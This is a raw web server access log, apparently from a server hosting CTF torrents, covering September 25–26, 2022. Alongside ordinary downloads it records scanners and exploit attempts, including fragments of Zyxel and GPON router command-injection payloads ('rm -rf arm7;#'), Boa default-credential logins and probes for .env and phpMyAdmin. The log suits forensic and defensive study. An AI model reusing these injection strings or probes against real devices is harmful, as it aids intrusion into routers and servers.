93.124.6.27 - - [25/Sep/2022:23:07:08 +0300] "GET /torrents/files/VirtLin.torrent HTTP/1.1" 200 435710 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
95.83.116.241 - - [25/Sep/2022:23:07:20 +0300] "GET /torrents/files/VirtLin.torrent HTTP/1.1" 200 435710 "http://away.vk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0"
5.181.80.185 - - [25/Sep/2022:23:09:11 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.185 - - [25/Sep/2022:23:09:11 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
177.84.40.14 - - [25/Sep/2022:23:10:06 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
138.68.163.102 - - [25/Sep/2022:23:11:50 +0300] "\x13\x94\x1B\x01\x004\x09\x00D#$#?\x22W\xB7" 400 157 "-" "-"
138.68.163.102 - - [25/Sep/2022:23:11:50 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1C\x81{J\xD1\x10\xC3\xB0\x80\xA1!" 400 157 "-" "-"
138.68.163.102 - - [25/Sep/2022:23:11:50 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x01\x09\xE3\xCF\xBA\xB1\x12^j\x9C\xEB\xBDIw %\xC7\xEB\xB9J\xE4\xD2\x0E\xD0\xAE\xEB\x83\xA0\xCA\xDA\xC0\xF6\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
138.68.163.102 - - [25/Sep/2022:23:11:50 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
218.75.125.132 - - [25/Sep/2022:23:12:23 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
218.75.125.132 - - [25/Sep/2022:23:12:23 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
80.94.92.231 - - [25/Sep/2022:23:29:43 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
172.91.47.43 - - [26/Sep/2022:00:25:20 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
172.91.47.43 - - [26/Sep/2022:00:25:20 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
51.12.52.122 - - [26/Sep/2022:00:35:45 +0300] "HEAD /robots.txt HTTP/1.0" 200 0 "-" "-"
5.181.80.186 - - [26/Sep/2022:00:59:06 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.186 - - [26/Sep/2022:00:59:06 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
167.248.133.118 - - [26/Sep/2022:01:05:45 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.118 - - [26/Sep/2022:01:05:45 +0300] "PRI * HTTP/2.0" 400 157 "-" "-"
167.248.133.118 - - [26/Sep/2022:01:05:45 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
217.146.82.142 - - [26/Sep/2022:01:06:56 +0300] "HEAD / HTTP/1.1" 200 0 "-" "Opera/3.0 (Windows NT  4.1; rv:2.0.1) Gecko/20100101 Firefox/3.4.0"
217.146.82.142 - - [26/Sep/2022:01:06:56 +0300] "GET / HTTP/1.1" 200 3320 "-" "Opera/3.0 (Windows NT  4.1; rv:2.0.1) Gecko/20100101 Firefox/3.4.0"
164.52.24.169 - - [26/Sep/2022:01:07:07 +0300] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03_\xAF\xC2Yp\x14\x93\xAC\xF8\xCE\xF1O\x13\x0C\xCE\xD0\x86\xF4\xC01\xEF\x95\xE5\x9E" 400 157 "-" "-"
164.52.24.169 - - [26/Sep/2022:01:07:08 +0300] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03;i\xBFo\xED\xD8O\xF0\x0E\xF1ja\x8A\x8B\xDC\xDC$\x19X\x17\x87\x83\xD0KxAoN\xD5_\x1E\xDA\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
164.52.24.169 - - [26/Sep/2022:01:07:08 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xE6D\xF4\xA6DE\xC9sx\xF0\xB2\xE5\x15\x99\x9Aw\x05\x8B-" 400 157 "-" "-"
164.52.24.169 - - [26/Sep/2022:01:07:09 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01H2\x14\xD5\xB6\x12!\x04\xE7\xC6\xAF\xDA\xDEcd\xA8\x8B>\xD7\xA0<f\xDDo\x1F\x98mK/v\xC3I\x00\x00\x12\xC0" 400 157 "-" "-"
164.52.24.169 - - [26/Sep/2022:01:07:20 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
164.52.24.169 - - [26/Sep/2022:01:07:26 +0300] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
165.231.182.133 - - [26/Sep/2022:01:44:27 +0300] "GET / HTTP/1.0" 200 3320 "http://ctf.pnzgu.ru/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
38.22.109.78 - - [26/Sep/2022:01:45:36 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
38.22.109.78 - - [26/Sep/2022:01:45:36 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
65.109.30.73 - - [26/Sep/2022:01:50:35 +0300] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
120.85.93.247 - - [26/Sep/2022:01:55:57 +0300] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 125 "-" "Hello, World"
120.85.93.247 - - [26/Sep/2022:01:55:57 +0300] "/tmp/gpon80&ipv=0" 400 157 "-" "-"
142.93.149.252 - - [26/Sep/2022:02:17:13 +0300] "GET / HTTP/1.0" 200 3320 "-" "-"
111.118.40.97 - - [26/Sep/2022:02:20:48 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
111.118.40.97 - - [26/Sep/2022:02:20:48 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
80.94.92.239 - - [26/Sep/2022:02:37:00 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.223.72.18 - - [26/Sep/2022:02:37:07 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
141.8.142.43 - - [26/Sep/2022:03:06:40 +0300] "GET /torrents/files/VirtLin.torrent HTTP/1.1" 200 435710 "-" "Mozilla/5.0 (compatible; YandexUserproxy; robot; +http://yandex.com/bots)"
177.55.157.224 - - [26/Sep/2022:03:56:21 +0300] "GET / HTTP/1.1" 400 157 "-" "-"
172.105.89.161 - - [26/Sep/2022:04:16:55 +0300] "\xBA\xABd\xA1EZC\xDBM\x87\xEE^\xFD\xBF\x159 X\xD4>\x12\x98\xC4<\xE0\x13\xCF\x00\xAC\xA09\xD7\x90#8~\x8C\xDE\x9DReF\xBF%1Q\xE0\x9D\x06&g\xBB\x82\x95\x19\xED\x07\x14\x19ZP\x80+\x94e\xC3\xE6\x85\x06\xA4\x99\x8B\x19l\x01\xEA\x88Y\x91\x16\x95\xC4\xC8\x0EH\x02\xC7\x93g\xC14FW\x05|\xFB\xF3T\xB8\xFD\xCB\xBB)\xE3\xCE\xDD\xCD7\x9E\xEFP\x8C\xA4[V\xFD\x98\xC9l\x82\xF5\xE4\xC1d\x87X\xF7\x9B\xBF\xE8q\x12\x99&\xDB,\xF5\x87\xD7\xA8\x97j;\xE3\xEA\xA7\xB4\xB0\x02\xAD\x8DE\x9B\xAAB\x80\x0E)\xA9\xE9\xAF}\x18\x8E\xB8\x1E\x99\x04\xEF\xA8\x8C\xE8\x04\xE2\xD3\xED)1\x91\xC1\x8F\x88\x8C\x81\xF0\xDB\xA5\x88\x95H\x9BZ\xAB\xCE\xBF\xF4E%P*\x88KFY6\x9E\xE7::j\xD4\x8A\xA8V\x9A\xAA\xAB\xAF\xC3&.\xED[\x04\xC5e\x7F\x08\xBE\x8Ar\xA7\xB0\x99F\xF7\x11\xE5\xD6\x96\x8CIm+w\x1C\xFDuU\x14\x0F!x\xAC\xE8MPy\xC3\x19!2\xA0\xED\xC0}!Rw\x14\x8E\x1B\xC4\xE1\xA0\xAF+\xADKk\xC5\xE0\x5Cs\x9C\xBD\xCB" 400 157 "-" "-"
23.251.102.74 - - [26/Sep/2022:04:32:29 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.207.214 - - [26/Sep/2022:04:42:57 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
95.161.131.237 - - [26/Sep/2022:05:20:02 +0300] "GET /config/getuser?index=0 HTTP/1.1" 404 125 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.45.207.109 - - [26/Sep/2022:05:42:19 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
176.115.197.124 - - [26/Sep/2022:05:42:39 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
60.191.125.35 - - [26/Sep/2022:06:04:46 +0300] "HEAD http://112.124.42.80:63435/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
152.89.196.211 - - [26/Sep/2022:06:50:18 +0300] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.242.20.11 - - [26/Sep/2022:06:52:24 +0300] "GET /.env HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.242.20.11 - - [26/Sep/2022:06:52:24 +0300] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
104.152.52.99 - - [26/Sep/2022:06:54:17 +0300] "GET / HTTP/1.0" 200 3320 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
192.241.194.31 - - [26/Sep/2022:07:06:30 +0300] "MGLNDD_82.179.90.12_80" 400 157 "-" "-"
5.45.207.109 - - [26/Sep/2022:07:33:02 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
152.89.196.211 - - [26/Sep/2022:07:56:56 +0300] "GET /actuator/gateway/routes HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.90.177.215 - - [26/Sep/2022:07:57:13 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
65.109.30.73 - - [26/Sep/2022:08:09:06 +0300] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-"
5.181.80.139 - - [26/Sep/2022:08:23:00 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.139 - - [26/Sep/2022:08:23:00 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
80.82.70.228 - - [26/Sep/2022:08:29:15 +0300] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
5.8.10.202 - - [26/Sep/2022:08:30:11 +0300] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03M\xC0+\x7F\xF0j\x8C\xEEh\xB7\xE6\xF9\xC8\xD0P9v\x80 \xDC\xD7\x0F\xB6\xCA\xB4\x8C\xE3" 400 157 "-" "-"
5.8.10.202 - - [26/Sep/2022:08:30:11 +0300] "GET /aaa9 HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [26/Sep/2022:08:30:11 +0300] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03r\x1E\xCF\xA0\xD2\x8E\x8E EG\x0F]\x06\xE0\xB4\x82\xD4\xD5\xF9\x15\xD9\x0C\xF8\xEBnnUMo\x93\xE7\x0F C\x93\x9D\xBEU\x90=\xF3)OK\xED\x09:k\x01BVC\xE3)\xF0S\xF8#\xAC" 400 157 "-" "-"
5.8.10.202 - - [26/Sep/2022:08:30:11 +0300] "GET /aab9 HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [26/Sep/2022:08:30:13 +0300] "GET / HTTP/1.1" 200 3320 "-" "fasthttp"
5.8.10.202 - - [26/Sep/2022:08:30:33 +0300] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xD4\xB6/8" 400 157 "-" "-"
5.8.10.202 - - [26/Sep/2022:08:30:33 +0300] "GET /aaa9 HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [26/Sep/2022:08:30:34 +0300] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x8F\xAF\x00\xDB\xC9\x9DJ\xAE\x22\xB9|\x15\xA8\x87\x04\xC7 \x88w\x98\xDF\x19\xDF,\xF3~a\x9FBn\xA7\xC7 1Y\x87\xEC\x95O\xF3\xB4\x5Cq9\xCF\xD8\xC8B\x9E\xD5yO\xCDt\x9E\xBD\xBA7" 400 157 "-" "-"
5.8.10.202 - - [26/Sep/2022:08:30:34 +0300] "GET /aab9 HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
138.68.163.102 - - [26/Sep/2022:08:47:29 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03F\x91Z\xECD\x95\x90\xD0Z\xD8B:~\x18\xB1\xA0Sq\x06\x9E\xB4\x86\x1F\xC10E\xD2@!\x05\x0C\xDC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:08:47:29 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
64.20.63.126 - - [26/Sep/2022:09:05:09 +0300] "GET /game/zhuce/index.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
146.196.120.44 - - [26/Sep/2022:09:06:35 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
95.161.131.237 - - [26/Sep/2022:09:10:30 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
203.76.241.10 - - [26/Sep/2022:09:19:24 +0300] "GET http://82.179.90.12:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
203.76.241.10 - - [26/Sep/2022:09:19:24 +0300] "GET http://82.179.90.12:80/mysql/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
203.76.241.10 - - [26/Sep/2022:09:19:24 +0300] "GET http://82.179.90.12:80/pma/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
203.76.241.10 - - [26/Sep/2022:09:19:24 +0300] "GET http://82.179.90.12:80/db/scripts/setup.php HTTP/1.0" 404 153 "-" "-"
192.241.209.58 - - [26/Sep/2022:09:24:09 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
172.91.47.43 - - [26/Sep/2022:09:35:50 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
172.91.47.43 - - [26/Sep/2022:09:35:50 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
92.21.179.157 - - [26/Sep/2022:09:47:58 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
92.21.179.157 - - [26/Sep/2022:09:47:58 +0300] "emoteSubmit=Save" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:03:06 +0300] "0\x8C\x82^9\x94\xCC\x19\x18K\x81\xBA\x03\xE4(\xC7" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:03:07 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB1\x1B" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:03:07 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03R\xF6\x05\xA9]\x1C\xEC;X\x05\xED\xFE\x86\x8C:\xD7\xFE\xE1\xA8" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:03:07 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
216.218.206.68 - - [26/Sep/2022:10:08:08 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
216.218.206.92 - - [26/Sep/2022:10:12:47 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83"
181.219.149.148 - - [26/Sep/2022:10:25:41 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
181.219.149.148 - - [26/Sep/2022:10:25:41 +0300] "emoteSubmit=Save" 400 157 "-" "-"
85.237.39.8 - - [26/Sep/2022:10:39:27 +0300] "GET /torrents/files/bos02-WinXP.ova.torrent HTTP/1.1" 200 93675 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
5.181.80.133 - - [26/Sep/2022:10:41:06 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
5.181.80.133 - - [26/Sep/2022:10:41:06 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
85.237.39.8 - - [26/Sep/2022:10:41:58 +0300] "GET /torrents/files/bos03-Debian.ova.torrent HTTP/1.1" 200 117057 "http://ctf.pnzgu.ru/torrents/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
80.94.92.239 - - [26/Sep/2022:10:47:49 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
138.68.163.102 - - [26/Sep/2022:10:48:31 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEEd5\x85\x89\xF4\xA3\xE3\xBA\x02U\xB8\xBF\xE1\xCD\xB23B1\x82\xFA\xDDn\xF8\xC0W\xCB\xA3\xE2n\xF40\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:48:31 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03{\xF3\x9DEMU" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:10:48:31 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
38.242.249.137 - - [26/Sep/2022:10:51:22 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
38.242.249.137 - - [26/Sep/2022:10:51:22 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
192.241.220.87 - - [26/Sep/2022:10:58:11 +0300] "GET /ReportServer HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
71.6.232.7 - - [26/Sep/2022:11:59:57 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
38.22.109.78 - - [26/Sep/2022:12:08:17 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
38.22.109.78 - - [26/Sep/2022:12:08:17 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
5.8.16.150 - admin [26/Sep/2022:12:40:34 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
43.143.179.84 - - [26/Sep/2022:12:55:44 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
43.143.179.84 - - [26/Sep/2022:12:55:44 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
20.163.54.95 - - [26/Sep/2022:13:55:43 +0300] "GET /.env HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.163.54.95 - - [26/Sep/2022:13:55:43 +0300] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
183.159.153.179 - - [26/Sep/2022:14:10:18 +0300] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 153 "-" "-"
183.136.225.35 - - [26/Sep/2022:14:21:24 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.136.225.35 - - [26/Sep/2022:14:22:02 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.35 - - [26/Sep/2022:14:22:04 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
183.136.225.35 - - [26/Sep/2022:14:22:05 +0300] "GET /robots.txt HTTP/1.1" 200 26 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
46.208.158.102 - - [26/Sep/2022:15:01:07 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
46.208.158.102 - - [26/Sep/2022:15:01:07 +0300] "emoteSubmit=Save" 400 157 "-" "-"
94.181.166.70 - - [26/Sep/2022:15:15:17 +0300] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1095 Yowser/2.5 Safari/537.36"
150.255.123.8 - - [26/Sep/2022:15:27:19 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
150.255.123.8 - - [26/Sep/2022:15:27:19 +0300] "remoteSubmit=Save" 400 157 "-" "-"
150.255.123.8 - - [26/Sep/2022:15:27:20 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
150.255.123.8 - - [26/Sep/2022:15:27:20 +0300] "remoteSubmit=Save" 400 157 "-" "-"
138.68.163.102 - - [26/Sep/2022:15:45:24 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x91[\xA2\x8B\xEFA\x0E\x8B\x03\xDA\xB9d$8,Pi\xB7\x1C\xA4bL\x05e4\x10\xBF}V^\x17\xF4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
